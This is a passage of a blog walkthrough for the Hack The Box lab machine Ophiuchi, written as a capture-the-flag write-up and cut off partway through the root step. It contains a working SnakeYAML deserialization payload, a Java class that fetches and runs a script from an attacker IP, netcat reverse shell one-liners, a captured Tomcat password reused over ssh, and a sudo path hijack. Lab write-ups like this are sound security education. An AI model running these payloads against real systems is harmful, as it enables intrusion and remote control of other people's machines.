@@ -1,0 +1,1277 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <!-- start custom head snippets -->
+<!-- Begin Jekyll GTM tag v1.0.3 -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MF4PLJ5');</script>
+<!-- End Jekyll GTM tag v1.0.3 -->
+
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi">
+<link rel="alternate" hreflang="x-default" href="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="https://davicruz.com/en-US/walkthrough/2021/07/htb-ophiuchi">
+        
+<link rel="alternate" hreflang="en" href="https://davicruz.com/en-US/walkthrough/2021/07/htb-ophiuchi">
+        
+    
+
+
+<!-- end custom head snippets -->
+
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Walktrough: HTB Ophiuchi | Davi Cruz</title>
+<meta name="description" content="Hello guys!  This week’s machine will be Ophiuchi, another medium-rated box from Hack The Box, created by felamos.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Walktrough: HTB Ophiuchi">
+<meta property="og:url" content="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi">
+
+
+  <meta property="og:description" content="Hello guys!  This week’s machine will be Ophiuchi, another medium-rated box from Hack The Box, created by felamos.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/r9JpwZX.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Walktrough: HTB Ophiuchi">
+  <meta name="twitter:description" content="Hello guys!  This week’s machine will be Ophiuchi, another medium-rated box from Hack The Box, created by felamos.">
+  <meta name="twitter:url" content="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.imgur.com/r9JpwZX.png">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-07-03T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+  </head>
+
+  <body class="layout--single wide">
+    <!-- Begin Jekyll GTM tag v1.0.3 (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MF4PLJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Jekyll GTM tag v1.0.3 (noscript) -->
+
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <!-- CUSTOM: Edit to adjust links to localized page -->
+        
+        
+          <a class="site-logo" href="/en-US"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+        
+        <a class="site-title" href="/en-US">
+          Davi Cruz
+          
+        </a>
+        
+        <!-- END CUSTOM: Edit to adjust links to localized page -->
+        <ul class="visible-links">
+          <!-- CUSTOM: Edit to get localized navigation --><li class="masthead__menu-item">
+              <a href="/en-US/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/tag/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/about/">About</a>
+            </li>
+<!-- END CUSTOM: Edit to get localized navigation -->
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://davicruz.com/">
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://davicruz.com/" itemprop="url">Davi Cruz</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Walktrough: HTB Ophiuchi">
+    <meta itemprop="description" content="Hello guys!This week’s machine will be Ophiuchi, another medium-rated box from Hack The Box, created by felamos.">
+    <meta itemprop="datePublished" content="2021-07-03T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://davicruz.com/walkthrough/2021/07/htb-ophiuchi" class="u-url" itemprop="url">Walktrough: HTB Ophiuchi
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-07-03T13:00:00-03:00">July 3, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/07/htb-ophiuchi">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>Hello guys!</p>
+
+<p>This week’s machine will be <strong>Ophiuchi</strong>, another medium-rated box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/27390">felamos</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>
+
+<p><img src="https://i.imgur.com/RgW95kn.png" alt="htb-ophiuchi" class="align-center"></p>
+
+<p>Recently I have been starting the recon of HTB boxes by searching a little about their names, as it or their images can give some cues on how to pwn them.</p>
+
+<p>Searching <code class="language-plaintext highlighter-rouge">define ophiuchi</code> in Google I was redirected to `define Ophiuchus, which is commonly represented as a man grasping a <strong>snake</strong>, what makes sense once we have a picture of a planet, astronaut, and some stars, but we’ll see that isn’t only that! <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Starting the enumeration, as usual, running a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to find the published services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.227
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-27 17:32 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.227
+Host is up <span class="o">(</span>0.077s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee <span class="o">(</span>RSA<span class="o">)</span>
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.18 seconds
+</code></pre></div></div>
+
+<h3 id="8080tcp---tomcat">8080/TCP - Tomcat</h3>
+
+<p>Accessing the Tomcat page at <code class="language-plaintext highlighter-rouge">http://10.10.10.227:8080</code> we see a YAML parser website, as below:</p>
+
+<p><img src="https://i.imgur.com/oDXT0S9.png" alt="Ophiuchi - Parse YAML" class="align-center"></p>
+
+<p>Sending a simple payload (<code class="language-plaintext highlighter-rouge">teste: true</code>), the following message is returned:</p>
+
+<blockquote>
+  <p>Due to security reasons this feature has been temporarily on hold. We will soon fix the issue!</p>
+</blockquote>
+
+<p>Once Tomcat is a Java web server, and, based on the message returned, searched about <code class="language-plaintext highlighter-rouge">java yaml rce vulnerability</code> where I’ve found a <a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">Medium post</a> talking about a vuln called <strong>SnakeYAML</strong>, which had a PoC like the website we have. Also, as <em>snake</em> have some references to the constellation from which this box was named, proves we’re on the right path <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20">.</p>
+
+<p>Following the suggestion in the post, started a simple http server using python (<code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code>) and sent the following payload:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
+  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
+    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.10.10/"</span><span class="o">]</span>
+  <span class="o">]]</span>
+<span class="o">]</span>
+</code></pre></div></div>
+
+<p>Just like the PoC in the blog post, the server searches for a file in <code class="language-plaintext highlighter-rouge">/META-INF/services/javax.script.ScriptEngineFactory</code> should provide a java class to be executed, which was confirmed based on the logs below.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.227 - - <span class="o">[</span>28/Feb/2021 12:19:22] code 404, message File not found
+10.10.10.227 - - <span class="o">[</span>28/Feb/2021 12:19:22] <span class="s2">"HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<h2 id="initial-access">Initial access</h2>
+
+<p>To gain initial access to this machine, used the project referenced in the blog post found (<a href="https://github.com/artsploit/yaml-payload">artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/artsploit/yaml-payload.git
+</code></pre></div></div>
+
+<p>As recommended, we’ll add our payload in the class named <code class="language-plaintext highlighter-rouge">AwesomeScriptEngineFactory.java</code> compile it and invoke it from the payload sent in the form.</p>
+
+<p>First I have tried to use payload <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f</code> directly in the class <code class="language-plaintext highlighter-rouge">yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java</code> but as it uses some redirects and pipelines (<code class="language-plaintext highlighter-rouge">&gt;</code> e <code class="language-plaintext highlighter-rouge">|</code>) noticed that the best approach would host a payload file in the webserver, download it and run from the victim machine, as the edit below:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"wget http://10.10.10.10/payload -O /tmp/exploit.sh"</span><span class="o">);</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"chmod a+x /tmp/exploit.sh"</span><span class="o">);</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"bash /tmp/exploit.sh"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>After modified, compiled the class and copied to the path where it was being called from:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac src/artsploit/AwesomeScriptEngineFactory.java
+jar <span class="nt">-cvf</span> yaml-payload.jar <span class="nt">-C</span> src/ <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>After that, as well as copying the payload file to be executed, sent the payload below on the webpage</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
+  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
+    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.10.10/yaml-payload.jar"</span><span class="o">]</span>
+  <span class="o">]]</span>
+<span class="o">]</span>
+</code></pre></div></div>
+
+<p>And voilá! We got a reverse shell in the box! <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">id
+</span>ophiuchi
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span>
+bash-5.0<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Started the enumeration, as usual, using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where I could identify the following points:</p>
+
+<ul>
+  <li>Tomcat service running with its specific account, allowing us to read the app files and logs</li>
+  <li>Enumerating the users in this box, found <strong>admin</strong>, the only one with console access (besides root).</li>
+</ul>
+
+<p>With this information, verified the creds for Tomcat from <code class="language-plaintext highlighter-rouge">/opt/tomcat/conf/tomcat-users.xml</code> file, where the password <strong>whythereisalimit</strong> was found.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"admin"</span> <span class="na">password=</span><span class="s">"whythereisalimit"</span> <span class="na">roles=</span><span class="s">"manager-gui,admin-gui"</span><span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Testing it for the user admin, we have confirmed that it was valid.</p>
+
+<p><img src="https://i.imgur.com/x7m50Ah.png" alt="Ophiuchi - Tomcat Manager" class="align-center"></p>
+
+<p>Once we have a Linux user with the same name <code class="language-plaintext highlighter-rouge">admin</code>, once tried to reuse the same creds using ssh, I was successful in logging in, obtaining the user’s flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">id
+</span>ophiuchi
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+&lt;redacted&gt;
+<span class="nt">-bash-5</span>.0<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Besides always give <code class="language-plaintext highlighter-rouge">linpeas.sh</code> another try, once we have the password for the user I like to check if the user can run anything with root privileges, where in this case we were lucky and got the following output:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>admin on ophiuchi:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre></div></div>
+
+<p>Inspecting the file <code class="language-plaintext highlighter-rouge">/opt/wasm-functions/index.go</code> we have the following content:</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+        <span class="s">"fmt"</span>
+        <span class="n">wasm</span> <span class="s">"github.com/wasmerio/wasmer-go/wasmer"</span>
+        <span class="s">"os/exec"</span>
+        <span class="s">"log"</span>
+<span class="p">)</span>
+
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">bytes</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">ReadBytes</span><span class="p">(</span><span class="s">"main.wasm"</span><span class="p">)</span>
+
+        <span class="n">instance</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">NewInstance</span><span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+        <span class="k">defer</span> <span class="n">instance</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="n">init</span> <span class="o">:=</span> <span class="n">instance</span><span class="o">.</span><span class="n">Exports</span><span class="p">[</span><span class="s">"info"</span><span class="p">]</span>
+        <span class="n">result</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">init</span><span class="p">()</span>
+        <span class="n">f</span> <span class="o">:=</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">!=</span> <span class="s">"1"</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Not ready to deploy"</span><span class="p">)</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ready to deploy"</span><span class="p">)</span>
+                <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"deploy.sh"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
+                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+                        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+                <span class="p">}</span>
+                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As we can see, this is a Go Lang script that loads its variables from <code class="language-plaintext highlighter-rouge">main.wasm</code> and, if the value <code class="language-plaintext highlighter-rouge">f</code> under property <code class="language-plaintext highlighter-rouge">info</code> is equal to <strong>1</strong>, the file <code class="language-plaintext highlighter-rouge">deploy.sh</code> is executed.</p>
+
+<p>As both files (<code class="language-plaintext highlighter-rouge">main.wasm</code> e <code class="language-plaintext highlighter-rouge">deploy.sh</code>) execute from a relative path, they are vulnerable to <strong>path hijacking</strong>, which we’ll try now.</p>
+
+<p>The initial step is to create both files and start them from a directory we have to write permissions, in this case, <code class="language-plaintext highlighter-rouge">/dev/shm</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /dev/shm/zurc
+<span class="nb">cd</span> /dev/shm/zurc
+</code></pre></div></div>
+
+<h3 id="deploysh"><code class="language-plaintext highlighter-rouge">deploy.sh</code></h3>
+
+<p>Creating this file is easy. At first, I’ll just place an <code class="language-plaintext highlighter-rouge">id</code> command to be sure we have succeeded with the permission abuse.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">id</span>
+</code></pre></div></div>
+
+<p>Once confirmed, we’ll replace this file contents with the reverse shell command line below</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">rm</span> /tmp/zurc<span class="p">;</span><span class="nb">mkfifo</span> /tmp/zurc<span class="p">;</span><span class="nb">cat</span> /tmp/zurc|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/zurc
+</code></pre></div></div>
+
+<h3 id="mainwasm"><code class="language-plaintext highlighter-rouge">main.wasm</code></h3>
+
+<p>This item is a little more complex to craft as when I first opened it in the editor, noticed that was something compiled and not plain text.</p>
+
+<p>Searching a little on how to modify a wasm file, found this blog post on Mozilla developers <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm">on how to convert a WebAssembly Text to WASM</a>, which also refers to the repo <a href="https://github.com/webassembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit no GitHub</a>.</p>
+
+<p>The following steps were used to inspect and modify the <code class="language-plaintext highlighter-rouge">main.wasm</code> file:</p>
+
+<ul>
+  <li>Locate the file in the victim machine and make a copy using <code class="language-plaintext highlighter-rouge">scp</code>
+</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ophiuchi</span>
+admin@ophiuchi:~<span class="nv">$ </span>find / <span class="nt">-type</span> f 2&gt; /dev/null | <span class="nb">grep </span>main.wasm
+/opt/wasm-functions/main.wasm
+/opt/wasm-functions/backup/main.wasm
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attacker Machine</span>
+<span class="nv">$ </span><span class="nb">cd</span> ./loot
+<span class="nv">$ </span>scp admin@10.10.10.227:/opt/wasm-functions/main.wasm <span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Downloaded the compiled <code class="language-plaintext highlighter-rouge">wabt</code> version to my working directory and extracted it</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
+<span class="nb">tar</span> <span class="nt">-xzvf</span> wabt-1.0.23-ubuntu.tar.gz
+</code></pre></div></div>
+
+<ul>
+  <li>Using the recently downloaded tool, converted the <code class="language-plaintext highlighter-rouge">main.wasm</code> to <code class="language-plaintext highlighter-rouge">main.wat</code>, where we got the following content</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wabt-1.0.23/bin/wasm2wat main.wasm <span class="nt">-o</span> main.wat
+<span class="nv">$ </span><span class="nb">cat </span>main.wat                                                                                           
+<span class="o">(</span>module
